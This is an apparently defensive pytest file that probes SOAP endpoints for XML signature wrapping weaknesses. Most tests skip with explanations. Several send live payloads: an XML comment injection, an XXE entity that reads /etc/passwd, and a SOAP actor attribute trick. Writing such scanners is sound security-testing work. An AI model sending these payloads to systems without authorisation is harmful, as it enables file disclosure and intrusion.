# ⚠️ DESTRUCTIVE TEST — Do not run against production.
# Set ENABLE_DESTRUCTIVE_TESTS=True in tests/active/config.py to enable.
"""Category 31: XML Signature Wrapping — Signedness bypass attacks."""
import re
import pytest

from tests.active.helpers import safe_post, url_join
from tests.active.config import ENABLE_DESTRUCTIVE_TESTS, TARGET_URL

if not ENABLE_DESTRUCTIVE_TESTS:
    pytestmark = pytest.mark.skip(
        reason="ENABLE_DESTRUCTIVE_TESTS=False in config.py — "
               "these tests modify server state, trigger lockouts, and may cause disruption."
    )

XML_SOAP_ENDPOINTS = [
    "/soap", "/api/soap", "/service", "/ws", "/webservice",
    "/api/xml", "/process", "/import",
]

# Minimal SOAP request for testing
SOAP_TEMPLATE = """<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body>
        <Action>{action}</Action>
    </soap:Body>
</soap:Envelope>"""


class TestXmlSignatureWrapping:
    def test_xml_signature_wrapping_basic(self):
        """Test basic XML signature wrapping attack."""
        pytest.skip(
            "XML signature wrapping requires capturing and manipulating signed SOAP messages. "
            "Test requires valid signed request from target. "
            "Implement in destructive suite with message interception."
        )


class TestXmlCommentInjection:
    def test_xml_signature_comment_injection(self):
        """Test XML comment injection in signed portion."""
        for endpoint in XML_SOAP_ENDPOINTS:
            malicious_xml = (
                '<?xml version="1.0"?>'
                '<soap:Envelope>'
                '<!-- <Action>Transfer 999</Action> -->'
                '<soap:Body>'
                '<Action>Transfer 1</Action>'
                '</soap:Body>'
                '</soap:Envelope>'
            )
            r = safe_post(url_join(endpoint), data=malicious_xml,
                          headers={"Content-Type": "application/xml"})
            if r and r.status_code == 200:
                pytest.skip(
                    f"Comment injection candidate at {endpoint}: "
                    "verify if comment text is processed"
                )


class TestXmlEntityReferenceSignature:
    def test_xml_entity_reference_bypass(self):
        """Test XML entity reference manipulation for signature bypass."""
        for endpoint in XML_SOAP_ENDPOINTS:
            xxe_xml = (
                '<?xml version="1.0"?>'
                '<!DOCTYPE soap [<!ENTITY evil SYSTEM "file:///etc/passwd">]>'
                '<soap:Envelope>'
                '<soap:Body>&evil;</soap:Body>'
                '</soap:Envelope>'
            )
            r = safe_post(url_join(endpoint), data=xxe_xml,
                          headers={"Content-Type": "application/xml"})
            if r and "root:" in r.text:
                pytest.fail(f"XML entity reference bypass at {endpoint}: file disclosure")


class TestXmlDuplicateElement:
    def test_xml_duplicate_element_signature_bypass(self):
        """Test XML signature bypass via duplicate element injection."""
        pytest.skip(
            "Duplicate element attack requires valid signed message and signature analysis. "
            "Implement in destructive suite."
        )


class TestXmlXpathConfusion:
    def test_xml_xpath_signature_validation_confusion(self):
        """Test XPath confusion in signature validation."""
        pytest.skip(
            "XPath confusion attack requires custom XML messages and verification of "
            "what element was actually signed vs. what was validated. "
            "Test in destructive suite with message inspection."
        )


class TestSoapActorAttribute:
    def test_soap_actor_attribute_bypass(self):
        """Test SOAP actor attribute manipulation for signature bypass."""
        for endpoint in XML_SOAP_ENDPOINTS:
            # SOAP actor attribute can exclude elements from processing
            soap_msg = (
                '<?xml version="1.0"?>'
                '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">'
                '<soap:Body actor="http://schemas.xmlsoap.org/soap/actor/next">'
                '<Malicious>Transfer All</Malicious>'
                '</soap:Body>'
                '</soap:Envelope>'
            )
            r = safe_post(url_join(endpoint), data=soap_msg,
                          headers={"Content-Type": "application/xml"})
            if r and r.status_code == 200:
                pytest.skip(
                    f"SOAP actor attribute accepted at {endpoint}: "
                    "verify if message bypasses signature validation"
                )


class TestXmlSignatureSkipped:
    def test_xml_signature_wrapping_requires_valid_message(self):
        pytest.skip(
            "XML signature wrapping attacks require valid signed messages from the application. "
            "Test by intercepting legitimate signed requests and modifying them. "
            "Use Burp Suite XML signature wrapping detection extension."
        )
